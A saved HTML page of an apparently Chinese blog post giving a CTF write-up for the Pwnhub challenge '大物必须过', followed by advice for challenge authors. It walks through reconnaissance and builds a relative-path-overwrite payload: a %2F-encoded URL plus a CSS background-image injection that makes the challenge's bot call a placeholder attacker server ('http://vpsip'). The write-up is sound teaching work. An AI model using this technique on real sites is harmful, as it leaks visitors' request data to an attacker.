@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<title>Pwnhub-大物必须过 Writeup</title>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="320" name="MobileOptimized"/>
+<meta content="yes" name="apple-mobile-web-app-capable"/>
+<meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
+<meta content="" name="description"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="Pwnhub-大物必须过 Writeup" name="twitter:title"/>
+<meta content="" name="twitter:description"/>
+<meta content="http://www.firesun.me" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="Pwnhub-大物必须过 Writeup" property="og:title"/>
+<meta content="" property="og:description"/>
+<meta content="火日小站" property="og:site_name"/>
+<meta content="Pwnhub-大物必须过 Writeup" itemprop="name"/>
+<meta content="" itemprop="description"/>
+<meta content="" name="theme-color"/>
+<link href="./Pwnhub-大物必须过 Writeup/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+<link href="./Pwnhub-大物必须过 Writeup/apple-touch-icon-precomposed.png" rel="apple-touch-icon"/>
+<link href="//fonts.googleapis.com/" rel="dns-prefetch"/>
+<link href="//fonts.googleapis.com/css?family=Noto+Serif:400,700,400italic|Open+Sans:700,400&amp;subset=latin,latin-ext" rel="stylesheet"/>
+<link href="./Pwnhub-大物必须过 Writeup/main.min.cssv=92699c119f" rel="stylesheet">
+<script src="./Pwnhub-大物必须过 Writeup/jquery.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+if (!window.jQuery) {
+	var script = document.createElement('script');
+	script.src = "/assets/js/jquery.min.js?v=92699c119f";
+	document.body.appendChild(script);
+}
+var ga_ua = 'UA-XXXXX-X';
+
+var disqus_shortname = 'firesun';
+
+var enable_pjax = true;
+// Pace Options
+// ==============
+window.paceOptions = {
+	catchupTime: 100,
+	minTime: 100,
+	elements: false,
+	restartOnRequestAfter: 500,
+	startOnPageLoad: false
+}
+// Ghostium Globals
+// ==============
+window.GHOSTIUM = {};
+GHOSTIUM.haveDisqus = typeof disqus_shortname !== 'undefined' && disqus_shortname !== 'example';
+GHOSTIUM.enablePjax = typeof enable_pjax !== 'undefined' ? enable_pjax : true;
+    </script>
+<script src="./Pwnhub-大物必须过 Writeup/head-scripts.min.jsv=92699c119f"></script>
+<link href="./Pwnhub-大物必须过 Writeup/pwnhub-da-wu-bi-xu-guo-writeup" rel="canonical">
+<meta content="origin" name="referrer">
+<meta content="火日小站" property="og:site_name">
+<meta content="article" property="og:type">
+<meta content="Pwnhub-大物必须过 Writeup" property="og:title">
+<meta content="写在最前 这回认真写一次wp，我会尽量写的完整一点，用狼人杀的话说就是把心路历程讲明白。主要两个目的，第一是给做题人一个参考，我在做这题的时候并不知道RPO是啥（看了别人的wp才知道），然而最终还是能做出来，我想这个过程还是值得新人借鉴的，也就是遇到一道新题应该怎么去入手，打CTF遇到自己没见过的知识点太多了，不能期待着撞知识点；第二其实更重要的是给出以后的出题人提一个醒，应该怎么出题。 先总结一下这题，这题我打3分。给3分的原因是纠正了我曾经的一个错误的观点，扣2分的原因有两点，第一点，目标不明确，难以从题目本身正确得出这题想要干什么，第二点，在提交bug页面设置验证码，却不在题目指出该页面的过滤条件，也不指出本题的考点不在该页，浪费做题人时间。下面说说我做题完整过程，供大家参考。 做题 1.查点（信息收集） 做题的第一步就是应该收集信息，因为题目基本上只有一台服务器，所以直接可上查点，而不是像渗透一样需要先踩点。做题时的查点三步曲：扫描端口，web目录扫描，浏览网站逻辑。 端口扫描 通过端口扫描可以收集到服务器运行了什么服务，一是要关注扫描到的开放服务，比如redis，rsync，这时候就要考虑对应服务的攻击，比如未授权访问。二是关注filtered的服务，这往往代表服务器运行着这类服务，" property="og:description">
+<meta content="http://www.firesun.me/pwnhub-da-wu-bi-xu-guo-writeup/" property="og:url">
+<meta content="2017-03-27T01:44:55.000Z" property="article:published_time">
+<meta content="2017-03-27T02:15:02.000Z" property="article:modified_time">
+<meta content="summary" name="twitter:card">
+<meta content="Pwnhub-大物必须过 Writeup" name="twitter:title">
+<meta content="写在最前 这回认真写一次wp，我会尽量写的完整一点，用狼人杀的话说就是把心路历程讲明白。主要两个目的，第一是给做题人一个参考，我在做这题的时候并不知道RPO是啥（看了别人的wp才知道），然而最终还是能做出来，我想这个过程还是值得新人借鉴的，也就是遇到一道新题应该怎么去入手，打CTF遇到自己没见过的知识点太多了，不能期待着撞知识点；第二其实更重要的是给出以后的出题人提一个醒，应该怎么出题。 先总结一下这题，这题我打3分。给3分的原因是纠正了我曾经的一个错误的观点，扣2分的原因有两点，第一点，目标不明确，难以从题目本身正确得出这题想要干什么，第二点，在提交bug页面设置验证码，却不在题目指出该页面的过滤条件，也不指出本题的考点不在该页，浪费做题人时间。下面说说我做题完整过程，供大家参考。 做题 1.查点（信息收集） 做题的第一步就是应该收集信息，因为题目基本上只有一台服务器，所以直接可上查点，而不是像渗透一样需要先踩点。做题时的查点三步曲：扫描端口，web目录扫描，浏览网站逻辑。 端口扫描 通过端口扫描可以收集到服务器运行了什么服务，一是要关注扫描到的开放服务，比如redis，rsync，这时候就要考虑对应服务的攻击，比如未授权访问。二是关注filtered的服务，这往往代表服务器运行着这类服务，" name="twitter:description">
+<meta content="http://www.firesun.me/pwnhub-da-wu-bi-xu-guo-writeup/" name="twitter:url">
+<meta content="Written by" name="twitter:label1">
+<meta content="火日攻天" name="twitter:data1">
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "火日小站",
+    "author": {
+        "@type": "Person",
+        "name": "火日攻天",
+        "image": "http://www.firesun.me/content/images/2016/04/avatar.png",
+        "url": "http://www.firesun.me/author/firesun/",
+        "sameAs": "http://www.firesun.me/"
+    },
+    "headline": "Pwnhub-大物必须过 Writeup",
+    "url": "http://www.firesun.me/pwnhub-da-wu-bi-xu-guo-writeup/",
+    "datePublished": "2017-03-27T01:44:55.000Z",
+    "dateModified": "2017-03-27T02:15:02.000Z",
+    "description": "写在最前 这回认真写一次wp，我会尽量写的完整一点，用狼人杀的话说就是把心路历程讲明白。主要两个目的，第一是给做题人一个参考，我在做这题的时候并不知道RPO是啥（看了别人的wp才知道），然而最终还是能做出来，我想这个过程还是值得新人借鉴的，也就是遇到一道新题应该怎么去入手，打CTF遇到自己没见过的知识点太多了，不能期待着撞知识点；第二其实更重要的是给出以后的出题人提一个醒，应该怎么出题。 先总结一下这题，这题我打3分。给3分的原因是纠正了我曾经的一个错误的观点，扣2分的原因有两点，第一点，目标不明确，难以从题目本身正确得出这题想要干什么，第二点，在提交bug页面设置验证码，却不在题目指出该页面的过滤条件，也不指出本题的考点不在该页，浪费做题人时间。下面说说我做题完整过程，供大家参考。 做题 1.查点（信息收集） 做题的第一步就是应该收集信息，因为题目基本上只有一台服务器，所以直接可上查点，而不是像渗透一样需要先踩点。做题时的查点三步曲：扫描端口，web目录扫描，浏览网站逻辑。 端口扫描 通过端口扫描可以收集到服务器运行了什么服务，一是要关注扫描到的开放服务，比如redis，rsync，这时候就要考虑对应服务的攻击，比如未授权访问。二是关注filtered的服务，这往往代表服务器运行着这类服务，"
+}
+    </script>
+<meta content="Ghost 0.7" name="generator">
+<link href="./Pwnhub-大物必须过 Writeup/rss" rel="alternate" title="火日小站" type="application/rss+xml">
+<link href="./Pwnhub-大物必须过 Writeup/zTreeStyle.css" rel="stylesheet" type="text/css"/>
+</link></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></meta></link></link></head>
+<body class="post-template">
+<button class="drawer-button" data-action="open-drawer" id="drawer-button"><i class="fa fa-bars"></i></button>
+<nav class="drawer" tabindex="-1">
+<div class="drawer-container">
+<!--.drawer-search(role="search")-->
+<ul class="drawer-list" role="navigation">
+<li class="drawer-list-item">
+<a data-pjax="" href="/">
+<i class="fa fa-home"></i>Home
+  </a>
+</li>
+<li class="drawer-list-item">
+<a data-pjax="" href="/tag/web">
+<i class="fa fa-rocket"></i>Web
+  </a>
+</li>
+<li class="drawer-list-item">
+<a href="http://www.firesun.me/rss/">
+<i class="fa fa-rss"></i>Subscribe to Feed
+  </a>
+</li>
+<li class="drawer-list-divider"></li>
+<li class="drawer-list-item drawer-list-title">
+  Follow me
+</li>
+<li class="drawer-list-item">
+<a href="http://twitter.com" target="_blank">
+<i class="fa fa-twitter"></i>Twitter
+  </a>
+</li>
+<li class="drawer-list-item">
+<a href="http://github.com/firesunCN" target="_blank">
+<i class="fa fa-github"></i>Github
+  </a>
+</li>
+</ul>
+</div>
+</nav>
+<div class="drawer-overlay"></div>
+<main class="container" id="container" role="main">
+<div class="surface">
+<div class="surface-container">
+<div class="content" data-pjax-container="">
+<section class="wrapper wrapper-post">
+<div class="wrapper-container">
+<article class="post post" itemscope="" itemtype="http://schema.org/BlogPosting" role="article">
+<section class="post-container">
+<header class="post-header">
+<ul class="post-meta-list">
+<li class="post-meta-item">
+<time datetime="2017-03-26" itemprop="datePublished">
+                  2 months ago
+                </time>
+</li>
+<li class="post-meta-item">
+<a data-disqus-identifier="22" href="#disqus_thread">Comments</a>
+</li>
+</ul>
+<h1 class="post-title" itemprop="name headline"><a data-pjax="" href="/pwnhub-da-wu-bi-xu-guo-writeup/" itemprop="url" title="Pwnhub-大物必须过 Writeup">Pwnhub-大物必须过 Writeup</a></h1>
+<!--h2 itemprop="about" class="post-subtitle"></h2-->
+</header>
+<aside class="post-side">
+<div class="post-author">
+<a class="post-author-avatar" href="http://www.firesun.me/">
+<img alt="火日攻天" src="./Pwnhub-大物必须过 Writeup/avatar.png"/>
+</a>
+<div class="post-author-info">
+<a class="post-author-name" href="http://www.firesun.me/">
+                  火日攻天
+                </a>
+<p class="post-author-bio"></p>
+</div>
+</div>
+<ul class="ztree" id="tree" style="width:100%"></ul>
+</aside>
+<div class="post-body" itemprop="articleBody">
+<h2 id="">写在最前</h2>
+<p>这回认真写一次wp，我会尽量写的完整一点，用狼人杀的话说就是把心路历程讲明白。主要两个目的，第一是给做题人一个参考，我在做这题的时候并不知道RPO是啥（看了别人的wp才知道），然而最终还是能做出来，我想这个过程还是值得新人借鉴的，也就是遇到一道新题应该怎么去入手，打CTF遇到自己没见过的知识点太多了，不能期待着撞知识点；第二其实更重要的是给出以后的出题人提一个醒，应该怎么出题。</p>
+<p>先总结一下这题，这题我打3分。给3分的原因是纠正了我曾经的一个错误的观点，扣2分的原因有两点，第一点，目标不明确，难以从题目本身正确得出这题想要干什么，第二点，在提交bug页面设置验证码，却不在题目指出该页面的过滤条件，也不指出本题的考点不在该页，浪费做题人时间。下面说说我做题完整过程，供大家参考。</p>
+<h2 id="">做题</h2>
+<h3 id="1">1.查点（信息收集）</h3>
+<p>做题的第一步就是应该收集信息，因为题目基本上只有一台服务器，所以直接可上查点，而不是像渗透一样需要先踩点。做题时的查点三步曲：<strong>扫描端口，web目录扫描，浏览网站逻辑</strong>。</p>
+<h4 id="">端口扫描</h4>
+<p>通过端口扫描可以收集到服务器运行了什么服务，一是要关注扫描到的开放服务，比如redis，rsync，这时候就要考虑对应服务的攻击，比如未授权访问。二是关注filtered的服务，这往往代表服务器运行着这类服务，但是iptables限制了其访问，比如发现11211是filtered的，而这题恰好有ssrf，就应该考虑用ssrf攻击Memcached服务。</p>
+<p><img alt="" src="./Pwnhub-大物必须过 Writeup/1.png"/></p>
+<p>本题没有开放特别的服务，不过运行着3306，可以推断web是php写的（不绝对）。</p>
+<h4 id="web">web目录扫描</h4>
+<p>用字典去扫描web目录往往能发现一些出题人留下的提示，比如经典的robots.txt，flag.php，.git，.svn，index.php~，phpinfo.php等等，有时能发现源码泄露，有时能发现隐藏的目录或者文件，或者网站结构。</p>
+<p><img alt="" src="./Pwnhub-大物必须过 Writeup/2.png"/></p>
+<p>本题通过扫描可以发现一个问题，index.phpxxxxx都会变成解析index.php，更重要的是，可以发现一个router.php的文件。这意味着该网站应该是通过rewrite将请求统一映射到一个页面，由这个页面路由请求，而这种模式可能遇到%2F问题，对apache或者nginx而言，%2F没有特殊的含义，而对php而言，获得的请求是解码后的，%2F会被解码为/，而/是有含义的，而这个点也是本题的关键（其实我在做到这一步的时候还没有想到%2F的问题，在后来的步骤中想到了）。</p>
+<h4 id="">浏览网站逻辑</h4>
+<p>快速浏览一篇网页，并测试网站逻辑，基本可以得出以下几个结论：</p>
+<ul>
+<li>注册页register.php：Username只允许A-Za-z0-9，Vow测试不存在注入。</li>
+<li>登录页user.php：Username只允许A-Za-z0-9，不存在注入。</li>
+<li>用户页user.php：不存在越权，只能看自己的用户资料，vow可控，但是被htmlspecialchars编码，在<code>&lt;p&gt;&lt;/p&gt;</code>之间，且强制UTF8编码，不存在xss。</li>
+<li>课程页classes.php：ID经过intval转换，不存在注入，值得注意的是，存在一个css，使用了../../，而该页本来就在根路径，似乎多此一举。</li>
+</ul>
+<p><img alt="" src="./Pwnhub-大物必须过 Writeup/3.png"/></p>
+<ul>
+<li>报bug页report_bug.php：Comment只允许A-Za-z0-9，Url必须<a href="http://52.80.19.55/">http://52.80.19.55/</a> 开头，不存在SSRF。</li>
+<li>答题页answer.php：只要是post就随机返回一个分数，所以该页无用。</li>
+</ul>
+<h3 id="2">2.分析题目目的，考点</h3>
+<p>信息收集完，就要开始分析这题的考点，需要我们做什么，是xss，还是ssrf，还是命令注入，然后分析怎么去达到目的。</p>
+<p>本题存在一个报告bug的页面，基本可以判断该题为xss，或者是想办法让bot请求用户网站（获取referer or其他的http header），由于不存在xss点，所以这题应该是要诱使机器人访问自己的服务器。</p>
+<p>分析完目的，接下来要想办法达到目的，不过到目前为止，似乎没有什么思路，user页可控，不过连标签都插不了，这时候可以思考一下之前发现的奇怪的地方，../../classes.css</p>
+<p>随手试了下路径发现了一个问题，<a href="http://52.80.19.55/classes.php/1/2/3/">http://52.80.19.55/classes.php/1/2/3/</a>
+ 加载了<a href="http://52.80.19.55/classes.php/1/classes.css">http://52.80.19.55/classes.php/1/classes.css</a> 而/classes.php/1/classes.css显示的是/classes.php/1/的内容，这点就非常有趣了，我们可以通过多级路径使得classes.css变成一个php，那么有没有可能让他指向我们可控的user.php，通过css标签比如引入一个background-image，这样就能实现bot访问我们服务器的目的。（嗯，就是这个点我打3分，我一直以为这样是不可以的，因为css不像html，按照规范，必须严格解析不允许有错误的，chrome的包容性这么强是我没想到的）</p>
+<p>接下来就要解决控制classes.css的问题，我们需要让整个网页显示classes.php，而classes.css指向user.php，这里我想到了urlencode，具体解释在上面，我是在这时候才想起用<code>%2F</code>，<code>%2E</code>去测试，发现浏览器不认<code>%2E</code>，会强制转为<code>.</code>，而<code>%2F</code>成功的骗过了浏览器和nginx，讲道理chrome和nginx一样需要背锅，因为文件名本来就不允许包含<code>/</code>，为什么不强制把<code>%2F</code>转换为<code>/</code></p>
+<p>接下来要解决css解析的问题，毕竟我们引入的css是一个网页，这个可以在本地直接测试，当然直接用<code>*{background-image:url(xxx);}</code>是不会生效的，我测试了<code>*/*{background-image:url(xxx);}</code>,<code>--&gt;*{background-image:url(xxx);}</code>,(构造一个标签尾，让chrome去关闭忽略前面的，不过没有效果)<code>*{background-image:url(xxx);}*{background-image:url(xxx);}*{background-image:url(xxx);}</code>（这个成功了，chrome竟然识别了）</p>
+<h3 id="3payload">3.构造payload</h3>
+<p>首先构造url，这个知道原理就很容易构造，随手构造了一个<a href="http://52.80.19.55/user.php/271/2/%2f..%2f..%2f..%2fclasses.php%2f71%2f/">http://52.80.19.55/user.php/271/2/%2f..%2f..%2f..%2fclasses.php%2f71%2f/</a> ，这样classes.css就会变为/user.php/271（ID要改）</p>
+<p>注册一个账号，构造vow，我精简了下，用了<code>*{}*{background-image:url(http://vpsip);}*{}</code></p>
+<p>然后提交构造的url</p>
+<p><img alt="" src="./Pwnhub-大物必须过 Writeup/4.png"/></p>
+<h2 id="">出题</h2>
+<p>在这之前，先说我自己出题的一件事，我第一次出大型赛事的CTF题，也就是BCTF2016，这年我出的题被Riatre大佬吐槽了，还被众多老外吐槽了，基本上被钦定为guessing题了，事后被各种教育应该怎么出题，当时众大佬是这么教育我的，CTF是一个游戏，应该让做题人感觉到玩得开心，经过自己的努力，能够学到东西，能够<strong>收获做出题的喜悦</strong>，而不是白白耗费时间，还什么都没学到。</p>
+<p>嗯，说的很有道理，道理我都懂，不过怎么做。其实这也是这1年来我思考的问题，怎么出好题。</p>
+<p>我自己总结了三条，不考弱智知识点，不设置不必要的障碍，<strong>给做题人方向上的引导</strong>，三点可以在归结为一条，站在做题人的角度思考问题。</p>
+<ul>
+<li>不考弱智知识点：什么是弱智知识点，就是你做出来觉得毫无收获的东西，比如爆破密码，站在做题人的角度，你一点也不希望遇到这些毫无卵用的考点吧</li>
+<li>不设置不必要的障碍：出题者的大忌，“我要让做题者做不出题”，比如让做题人猜后台路径（对，即使是fuzz后台也要尽量避免，这个度怎么掌握呢，就是你自己来做，你手试，你能试出来，比如robots.txt，比如.git），猜加密密码，或者密码过长，导致hash只有cmd能解密，没法本地跑出（这我犯过的错误），站在做题人的角度，你遇到这样的题，你会不会掏刀捅出题人。</li>
+<li>给做题人方向上的引导：用人话说，你得让做题人知道他该做什么，而不是把时间浪费在无用的测试上，比如一道注入题，把题出的非常像xss题，导致做题人花了大量的时间测试xss，最后才发现是注入，那做题人浪费的那些时间是不是白白浪费了，是不是什么都没学到，何来喜悦？所以说这一点，也是我觉得最重要的一点，你必须要让做题人知道，他要干什么，他可以在这个方向去花他的时间，想办法，怎么绕过，怎么去实现xxxxxxx，这样他的时间没有被浪费，最终查阅资料，学到了姿势，做出题了，是不是很爽。所以对出题人而言，必须想办法暗示做题人，你该做啥，甚至直接在题目里说明。</li>
+</ul>
+<p>以本题为例，犯的错误就是第三点，作为出题人，你一定要假想你是做题人，而且你是不知道出题人要你做啥的，所以你拿到题，会一遍分析，发现这题明显是xss题啊，绕过过滤吧，嗯我就是这样的，我花了很多时间想怎么xss成功，甚至在有烦人的验证码的情况下去盲测那个comment能不能xss，还要查资料，是不是有最新的黑科技可以干成？结果呢，我做出来后是不是想打人。所以对这题而言，如果能够委婉的提示bot的ua含有flag，就能让做题人少浪费很多时间。</p>
+<p>而在我接下来的出题中，基本开始贯彻这个思想，比如AliCTF的homework，我在readme.html里暗示了用注入来替换缓存是能够实现的，Resume System里可以用nmap发现11211端口是filtered的，提示用ssrf攻击memcached，比如还是BCTF被吐槽的那题，如果在题目主干加上pentest，同时不设置那么变态的hash，就不至于被喷的那么惨。而pwnhub我出的那道题就又犯了错误，应该把hint（admin只是普通用户）直接放在题目主干上，或者改admin为firesun。这样可以加快做题人发现是self-xss的进度，把时间投入到有意义的事上。</p>
+<p>当然其实出题还有很多要注意的比如难度控制，考点数量控制等等，这里就不细说了，还是那句话，多站在做题人的角度思考问题。</p>
+<p>今年BCTF，准备了1-2题，个人觉得难度中偏难，还请各位大佬到时候多提意见。也希望众出题人能够在将来多出一些高质量的题目，Orz</p>
+</div>
+<footer class="post-footer">
+<div class="post-author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<a class="post-author-avatar" href="http://www.firesun.me/">
+<img alt="火日攻天" itemprop="image" src="./Pwnhub-大物必须过 Writeup/avatar.png"/>
+</a>
+<div class="post-author-info">
+<h4 class="post-footer-heading">Written By</h4>
+<a class="post-author-name" href="http://www.firesun.me/" itemprop="url">
+<span itemprop="name">火日攻天</span>
+</a>
+<p class="post-author-bio" itemprop="description"></p>
+<p class="post-author-website">
+<a href="http://www.firesun.me/" rel="nofollow">http://www.firesun.me/</a>
+</p>
+<p class="post-info">
+<b class="post-info-title">Published on</b>
+<time class="post-date">March 26, 2017</time>
+</p>
+</div>
+</div>
+<div class="post-social">
+<h4 class="post-footer-heading">Spread the word</h4>
+<a data-action="share-twitter" href="#"><i class="fa fa-fw fa-lg fa-twitter"></i></a>
+<a data-action="share-facebook" href="#"><i class="fa fa-fw fa-lg fa-facebook"></i></a>
+<a data-action="share-gplus" href="#"><i class="fa fa-fw fa-lg fa-google-plus"></i></a>
+</div>
+</footer>
+</section>
+<section class="post-comments" itemprop="comment">
+<div id="disqus_thread"></div>
+</section>
+</article>
+<footer class="footer" role="contentinfo">
+<p><small>© 2017. All Rights Reserved.</small></p>
+<p><small><a href="http://ghostium.oswaldoacauan.com/" target="_blank">Ghostium Theme</a> by <a href="http://twitter.com/oswaldoacauan" target="_blank">@oswaldoacauan</a></small></p>
+<p><small>Proudly published with <a href="http://ghost.org" target="_blank">Ghost</a></small></p>
+</footer>
+</div>
+</section>
+<script type="text/javascript">
+  if(GHOSTIUM.haveDisqus) {
+    var disqus_identifier = '22';
+
+    if(typeof DISQUS !== 'object') {
+      (function () {
+      var s = document.createElement('script'); s.async = true;
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+      }());
+    }
+  } else {
+    document.querySelector('.post-comments').remove();
+  }
+</script>
+</div>
+</div>
+</div>
+</main>
+<script src="./Pwnhub-大物必须过 Writeup/jquery.ztree.core-3.5.min.js" type="text/javascript"></script>
+<script src="./Pwnhub-大物必须过 Writeup/jquery.ztree_toc.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+	$('#tree').ztree_toc({
+	});
+});
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?a05502e657ee797b511d22bf25fae2a5";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./Pwnhub-大物必须过 Writeup/foot-scripts.min.jsv=92699c119f"></script>
+<script type="text/javascript">
+
+      if(GHOSTIUM.haveDisqus) {
+        (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+      }
+    </script>
+</body>
+</html>
